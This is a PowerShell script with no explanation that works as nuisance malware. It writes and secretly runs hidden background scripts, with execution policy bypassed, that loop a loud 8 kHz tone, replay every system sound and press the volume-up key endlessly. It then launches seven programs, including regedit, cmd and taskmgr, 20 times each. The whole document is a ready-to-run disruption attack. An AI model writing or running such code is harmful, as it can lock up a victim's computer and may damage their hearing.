$notificationScriptContent = @'
Function Send-NotificationSoundSpam {
    param ([int]$Interval = 0)
    
    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | ForEach-Object {
        (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").PlaySync()
        Start-Sleep -Milliseconds 1
    }
}

Send-NotificationSoundSpam
'@
$notificationScriptPath = "$PWD\notification.ps1"
Set-Content -Path $notificationScriptPath -Value $notificationScriptContent

$trayScriptContent = @'
$WScript = New-Object -com wscript.shell
while ($true) {
    $WScript.SendKeys([char]175)
    Start-Sleep -Milliseconds 1
}
'@
$trayScriptPath = "$PWD\tray.ps1"
Set-Content -Path $trayScriptPath -Value $trayScriptContent

$speechScriptContent = @'
Add-Type -TypeDefinition @"
using System;
using System.Media;
using System.IO;

public class ToneGenerator {
    public static void PlayTone(int frequency, int durationMs) {
        int sampleRate = 44100;
        int samples = (int)((sampleRate * durationMs) / 1000.0);
        MemoryStream ms = new MemoryStream();
        BinaryWriter bw = new BinaryWriter(ms);

        // WAV header
        int byteRate = sampleRate * 2;
        bw.Write(System.Text.Encoding.ASCII.GetBytes("RIFF"));
        bw.Write(36 + samples * 2);
        bw.Write(System.Text.Encoding.ASCII.GetBytes("WAVEfmt "));
        bw.Write(16);
        bw.Write((short)1);
        bw.Write((short)1);
        bw.Write(sampleRate);
        bw.Write(byteRate);
        bw.Write((short)2);
        bw.Write((short)16);
        bw.Write(System.Text.Encoding.ASCII.GetBytes("data"));
        bw.Write(samples * 2);

        double amplitude = 32760;
        double angle = 2 * Math.PI * frequency / sampleRate;
        for (int i = 0; i < samples; i++) {
            short sample = (short)(amplitude * Math.Sin(angle * i));
            bw.Write(sample);
        }

        ms.Position = 0;
        SoundPlayer player = new SoundPlayer(ms);
        player.PlaySync();
    }
}
"@

while ($true) {
    [ToneGenerator]::PlayTone(8000, 1000)
}
'@
$speechScriptPath = "$PWD\speech.ps1"
Set-Content -Path $speechScriptPath -Value $speechScriptContent

Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$notificationScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$trayScriptPath`""

$WScript = New-Object -com wscript.shell
1..50 | % { $WScript.SendKeys([char]175) }

$processes = @("calc.exe", "explorer.exe", "notepad.exe", "cmd.exe", "regedit.exe", "msinfo32.exe", "taskmgr.exe")
for ($i = 1; $i -le 20; $i++) {
    foreach ($process in $processes) {
        Start-Process -FilePath $process -NoNewWindow
    }
}
